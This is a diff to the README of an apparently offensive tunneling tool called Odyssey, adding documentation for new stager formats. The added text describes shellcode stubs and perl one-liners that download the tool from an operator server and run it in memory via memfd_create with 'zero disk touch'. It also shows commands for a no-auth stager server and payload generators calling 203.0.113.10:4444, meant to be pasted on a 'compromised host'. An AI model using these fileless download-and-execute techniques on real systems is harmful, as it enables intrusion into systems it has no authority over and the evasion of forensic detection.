@@ -50,6 +50,11 @@ TCP and UDP relay, reverse tunneling with multiplexing, SOCKS5 proxy, TLS/mTLS t
 - **Stager server.** `odyssey stager-server` serves the Odyssey binary over a raw TCP socket. Supports optional token authentication and single-use mode.
 - **One-liner generator.** `odyssey stager --format oneliner` prints a ready-to-paste one-liner that downloads and executes Odyssey. Linux (~85 chars, bash `/dev/tcp`) and Windows (~285 chars, PowerShell `TcpClient`).
 - **Base64 mini-stager.** `odyssey stager --format base64` generates ~13 lines of base64 encoding a pre-compiled mini-stager (~18 KB) patched with the server address and token. The mini-stager authenticates, downloads Odyssey, and executes it in memory via `memfd_create` (Linux >= 3.17).
+- **Shellcode stub (disk).** `odyssey stager --format stub` generates a one-line base64 payload with a 567-byte ELF stub that connects, downloads, and executes via `memfd_create` (fallback to `/tmp`).
+- **Shellcode stub (RAM).** `odyssey stager --format stub-shm` writes the stub to `/dev/shm` (tmpfs) instead of disk. Requires exec-enabled `/dev/shm`.
+- **Shellcode stub (fileless).** `odyssey stager --format stub-memfd` wraps the stub in a perl one-liner that loads it via `memfd_create`. Zero disk touch. Requires perl.
+- **Pure perl fileless.** `odyssey stager --format perl-memfd` generates a ~200-char perl one-liner that downloads and executes entirely via `memfd_create`. Shortest fileless format.
+- **Format catalog.** `odyssey stager --format list` prints all 7 delivery formats with line count, size, disk impact, and dependencies.
 
 ### Cross-platform
 
@@ -245,6 +250,31 @@ Paste the output on the compromised host. Odyssey downloads and starts relaying.
 ```
 
 Paste the output (~13 lines) on the target. The mini-stager authenticates, downloads Odyssey, and runs it in memory.
+
+**Option C: shellcode stub (one-line, no-auth, disk/RAM/fileless)**
+
+```bash
+# Operator starts stager-server in no-auth mode (stubs use raw TCP)
+./bin/odyssey stager-server --listen 0.0.0.0:4444 --binary ./bin/odyssey --no-auth
+
+# Generate for disk (/tmp fallback), RAM (/dev/shm), or fully fileless (perl+memfd)
+./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format stub
+./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format stub-shm
+./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format stub-memfd
+```
+
+**Option D: pure perl fileless (~200 chars, no compiled stub)**
+
+```bash
+./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format perl-memfd
+```
+
+**List all delivery formats:**
+
+```bash
+./bin/odyssey stager --format list
+./bin/odyssey stager --format list --os linux
+```
 
 ## Usage examples
 
